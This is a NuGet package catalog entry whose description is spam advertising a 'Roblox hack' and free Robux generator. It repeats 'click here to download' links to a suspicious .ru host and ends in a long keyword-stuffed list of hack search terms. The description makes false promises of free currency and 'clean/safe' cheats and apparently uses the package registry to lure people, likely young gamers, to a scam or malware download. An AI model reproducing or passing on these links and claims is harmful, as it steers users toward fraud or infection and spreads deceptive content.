{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.17.54.37/_roblox-hack-working-2022-version-hgm.4.7.38.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "0e8396ac-10e1-4411-80ff-3161fa2a3b5c",
  "catalog:commitTimeStamp": "2022-01-26T17:54:37.5707841Z",
  "created": "2022-01-26T17:52:18.29Z",
  "description": "# _Roblox hack Working 2022 Version hgm\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://15.bltadwin.ru/hack.php](http://15.bltadwin.ru/hack.php)\n\n\nRoblox ; pigeon_man 1. pigeon_man ; raspy_pi 2. raspy_pi ; faizannehal 3. faizannehal ; h0nde 4. h0nde ; geekboy 5. geekboy. Free Roblox cheats. Current and working cheats for the popular online game Roblox you can download from our website. A large number of functions, many different. ROBUX. Free Robux. Generator !The perfect hack tool that generates free robux instantly! Easy Hack to get free robux. Noob or pro? Does no.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://15.bltadwin.ru/hack.php](http://15.bltadwin.ru/hack.php)\n\nBest website for Roblox exploits, a developers community, and more from WeAreDevs. roblox hack free robux,here you can hack unlimited robux for free - robux hack generator is the best place to hack unlimited resources for free,also you can generate to your download it Now % clean/safe. Hacks  Cheats. for Roblox Scripts. We have every available Roblox hack on the internet on our website. You can find cheats for almost any Roblox game script here. Adopt Me Hack. Arsenal Hack. Blox Fruits Hack. Roblox is a gaming platform and game creation tool that brings together gamers and developers. It allows its users to design and create.\n\nroblox hackers, roblox hackers 2021, roblox hack robux, roblox hack extension, roblox hackers usernames 2021, roblox hackers 2022, roblox hacks for chromebook, roblox hacker 1x1x1x1, roblox hack 2021, roblox hack free robux, roblox hack script mobile, roblox hack github, roblox hack app ios, roblox hack clients 2021, roblox hack app download ios 2021, roblox hack and slash games, roblox hack adopt me, roblox hack admin script, roblox hack admin commands, roblox hack attack, roblox hack aimbot, roblox hack bedwars, roblox hack brookhaven, roblox hack ban, roblox hack big paintball, roblox hack book, roblox hack blox fruits, roblox hack btools, roblox hack bee swarm simulator, b tools roblox hack, roblox hack codes, roblox hack chrome extension, roblox hack commands, roblox hack client free, roblox hack client mac, roblox hack computer game, roblox hack chromebook, roblox hacks.c, roblox c'est fait hacker, roblox hack da hood, roblox hack download pc no virus, roblox hack da hood mobile, roblox hack download pc 2021, roblox hack download ios 2021, roblox hack discord, roblox hack dll, roblox hack download mac, d-day roblox hack, roblox d-day hack script, roblox d day hacked, charli d'amelio roblox hack, roblox hack executor mac, roblox hack executor download, roblox hack engine, roblox hack executor no virus, roblox hack executor, roblox hack exploit, roblox hack electron, e-hack roblox, roblox e stato hackerato, stef e phere roblox hacker, roblox hack for mac, roblox hack for ios, roblox hack for chromebook, roblox hack fly, roblox hack face, roblox hack for robux no human verification, roblox hack for pc, roblox hack gui, roblox hack gui script, roblox hack generator, roblox hack generator no human verification, roblox hack god mode, roblox hack greasy fork, roblox hack google chrome, roblox hack hair, roblox hack hub, roblox hack hide and seek, roblox hack how to get free robux 2020, roblox hack how to get unlimited robux, roblox hack happymod, roblox hack how to fly, roblox headless hack, roblox hack ios, roblox hack incidents, roblox hack ios no jailbreak, roblox hack injectors, roblox hack ipa, roblox hack ipa download, roblox hack inspect, roblox hack iosgods, is roblox hacked, is roblox hacked right now, is roblox hacked 2021, is roblox hacking illegal, is roblox hacked today 2021, is roblox hacked 2021 october, is roblox hacks safe, is roblox hacked october 28 2021, roblox hack jjsploit, roblox hack jailbreak free download, roblox hack jump, roblox hack jailbreak script, roblox hack jailbreak money, roblox hack jump infinite, roblox hack jailbreak download, roblox hack jailbreak auto rob, roblox hack ",
  "id": "_Roblox-hack-Working-2022-Version-hgm",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T17:54:20.727Z",
  "listed": true,
  "packageHash": "zokKEWNxCbjpLTG2jsW22rAWhQ48QE6ToMWLjCoxN0BYgviOWivVKSiSrc1xMZ/O25bkCWPcS12jHrPKlZfGJA==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11632,
  "published": "2022-01-26T17:52:18.29Z",
  "requireLicenseAcceptance": false,
  "title": "_Roblox-hack-Working-2022-Version-hgm",
  "verbatimVersion": "4.7.38",
  "version": "4.7.38",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.17.54.37/_roblox-hack-working-2022-version-hgm.4.7.38.json#htqrcivfzu.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1502,
      "fullName": "htqrcivfzu.nuspec",
      "length": 4442,
      "name": "htqrcivfzu.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.17.54.37/_roblox-hack-working-2022-version-hgm.4.7.38.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9470,
      "fullName": ".signature.p7s",
      "length": 9470,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}